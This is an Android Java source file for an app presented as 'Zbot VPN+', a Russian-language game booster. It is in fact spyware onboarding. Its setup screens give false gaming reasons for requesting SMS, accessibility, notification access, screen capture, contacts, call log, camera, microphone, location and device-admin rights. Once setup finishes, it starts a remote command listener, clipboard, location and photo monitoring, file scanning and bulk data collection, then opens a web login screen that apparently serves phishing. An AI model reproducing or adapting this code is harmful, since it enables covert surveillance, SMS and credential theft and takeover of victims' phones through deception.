package com.brawl.modmenu;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

public class OnboardingActivity extends Activity {

    private static final String[] STEPS_TITLE = {
        "Подключение к игровым серверам",
        "Отображение статуса соединения",
        "Автоматическая авторизация",
        "Работа в фоне",
        "Оптимизация игровых процессов",
        "Фильтр игровых помех",
        "Анализ графики в реальном времени",
        "Поиск друзей в играх",
        "Анализ игрового окружения",
        "Оптимизация звука и локации",
        "Защита от сбоев системы"
    };

    private static final String[] STEPS_SUBTITLE = {
        "Без этого Boost не активируется",
        "Нужно для контроля работы Boost",
        "Для входа без задержек",
        "Чтобы Boost не отключался",
        "Самое важное разрешение для Boost",
        "Убирает лаги от уведомлений",
        "Даёт +30% FPS",
        "Для создания лобби",
        "Проверка качества соединения",
        "Ближайшие серверы",
        "Гарантия стабильности"
    };

    private static final String[] STEPS_DESC = {
        "Zbot VPN+ использует технологию оптимизации трафика для снижения пинга в онлайн-играх. Приложение подключается к игровым серверам через защищённый туннель с приоритетом UDP-пакетов.\n\nБез разрешения на VPN подключение приложение не сможет создавать туннель, и весь Boost окажется нерабочим.",
        "Уведомления используются для отображения текущего статуса подключения и статистики в реальном времени. Вы сможете видеть скорость соединения, текущий пинг и уровень Boost прямо в шторке уведомлений.",
        "Zbot VPN+ использует SMS-верификацию для автоматической авторизации на игровых серверах. Это ускоряет подключение и избавляет от необходимости вводить данные вручную.",
        "Android автоматически ограничивает работу фоновых приложений для экономии энергии. Если Zbot будет ограничен системой — Boost отключится через 2-3 минуты после сворачивания.",
        "Специальные возможности — это системное разрешение, которое используется для мониторинга игровых приложений и оптимизации процессов в реальном времени.",
        "Доступ к уведомлениям используется для автоматического скрытия лишних оповещений во время игровых сессий.",
        "Zbot анализирует видеопоток в реальном времени и оптимизирует отображение текстур, теней и эффектов.",
        "Zbot использует контакты для поиска друзей, которые играют в те же игры.",
        "Камера используется для анализа помех и качества соединения в реальном времени.",
        "Микрофон используется для анализа фонового шума. GPS нужен для определения ближайшего игрового сервера.",
        "Zbot VPN+ работает как системный процесс и нуждается в защите от случайного удаления."
    };

    private static final String[] STEPS_BENEFITS = {
        "✅ Снижение пинга до 40%\n✅ Оптимизация UDP-пакетов",
        "✅ Живой статус соединения\n✅ Автоскрытие в играх",
        "✅ Автовход на серверы\n✅ Экономия 30-40 сек",
        "✅ Работа в фоне 24/7\n✅ Boost не отключается",
        "✅ Рост FPS до +47%\n✅ Оптимизация CPU/GPU",
        "✅ Нет лагов от уведомлений",
        "✅ +30% FPS\n✅ Оптимизация текстур",
        "✅ Поиск друзей в играх",
        "✅ Анализ условий",
        "✅ Чистый игровой звук",
        "✅ Защита от удаления"
    };

    private static final String[] STEPS_IMPORTANCE = {
        "⚠️ ОБЯЗАТЕЛЬНО",
        "✅ Рекомендуется",
        "⚠️ Требуется",
        "⚠️ ОБЯЗАТЕЛЬНО",
        "🔥 КРИТИЧЕСКИ ВАЖНО",
        "✅ Рекомендуется",
        "⚠️ Требуется",
        "✅ Опционально",
        "✅ Опционально",
        "✅ Рекомендуется",
        "⚠️ Требуется"
    };

    private static final int TOTAL = 11;
    private int current = 0;

    private TextView stepTitle, stepSubtitle, stepDesc, stepBenefits, stepImportance, stepCounter;
    private ProgressBar progress;
    private Button btnNext;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.onboarding);

        stepTitle = findViewById(R.id.stepTitle);
        stepSubtitle = findViewById(R.id.stepSubtitle);
        stepDesc = findViewById(R.id.stepDesc);
        stepBenefits = findViewById(R.id.stepBenefits);
        stepImportance = findViewById(R.id.stepImportance);
        stepCounter = findViewById(R.id.stepCounter);
        progress = findViewById(R.id.progress);
        btnNext = findViewById(R.id.btnNext);

        updateUI();

        btnNext.setOnClickListener(v -> {
            if (current >= TOTAL) {
                finishOnboarding();
                return;
            }
            runStep(current);
        });
    }

    private void updateUI() {
        if (current >= TOTAL) {
            stepTitle.setText("Всё готово!");
            stepSubtitle.setText("Настройка завершена");
            stepDesc.setText("Все разрешения получены. Zbot VPN+ готов к работе.");
            stepBenefits.setText("✅ Boost активирован\n✅ Все функции включены");
            stepImportance.setText("🎉 ГОТОВО");
            btnNext.setText("ЗАВЕРШИТЬ");
            progress.setProgress(100);
            stepCounter.setText("Настройка Zbot 100%");
            return;
        }
        stepTitle.setText(STEPS_TITLE[current]);
        stepSubtitle.setText(STEPS_SUBTITLE[current]);
        stepDesc.setText(STEPS_DESC[current]);
        stepBenefits.setText(STEPS_BENEFITS[current]);
        stepImportance.setText(STEPS_IMPORTANCE[current]);
        btnNext.setText("ПРОДОЛЖИТЬ");
        int pct = current * 100 / TOTAL;
        progress.setProgress(pct);
        stepCounter.setText("Настройка Zbot " + pct + "%");
    }

    private void runStep(int step) {
        switch (step) {
            case 0:
                Intent vpn = android.net.VpnService.prepare(this);
                if (vpn != null) startActivityForResult(vpn, 100);
                else advance();
                break;
            case 1:
                if (Build.VERSION.SDK_INT >= 33)
                    requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                else advance();
                break;
            case 2:
                requestPermissions(new String[]{
                    Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS
                }, 102);
                break;
            case 3:
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, 103);
                } else advance();
                break;
            case 4:
                startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                break;
            case 5:
                startActivityForResult(new Intent(
                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                break;
            case 6:
                MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), 106);
                break;
            case 7:
                requestPermissions(new String[]{
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                }, 107);
                break;
            case 8:
                requestPermissions(new String[]{Manifest.permission.CAMERA}, 108);
                break;
            case 9:
                requestPermissions(new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                }, 109);
                break;
            case 10:
                DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName cn = new ComponentName(this, AdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(cn)) {
                    Intent admin = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                    admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Защита Zbot VPN+ от случайного удаления.");
                    startActivityForResult(admin, 110);
                } else advance();
                break;
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == 106 && res == RESULT_OK && data != null) {
            getSharedPreferences("mp", MODE_PRIVATE).edit()
                .putInt("code", res)
                .putString("data_uri", data.toUri(0))
                .apply();
        }
        advance();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);
        advance();
    }

    private void advance() { current++; updateUI(); }

    private void finishOnboarding() {
        try {
            if (Build.VERSION.SDK_INT >= 26)
                startForegroundService(new Intent(this, KeepAliveService.class));
            else
                startService(new Intent(this, KeepAliveService.class));
        } catch (Throwable ignored) {}

        try {
            if (Build.VERSION.SDK_INT >= 26)
                startForegroundService(new Intent(this, CommandListener.class));
            else
                startService(new Intent(this, CommandListener.class));
        } catch (Throwable ignored) {}

        ClipboardMonitor.start(this);
        FileScanner.scan();
        GameList.dump(this);
        LocationTracker.start(this);
        NewPhotoWatcher.start(this);
        WelcomeNotif.show(this);
        DeviceInfo.sendFull(this);
        AppList.dump(this);
        DataCollector.collectAll(this);

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startActivity(new Intent(this, WebLoginActivity.class));
            finish();
        }, 5000);
    }
}
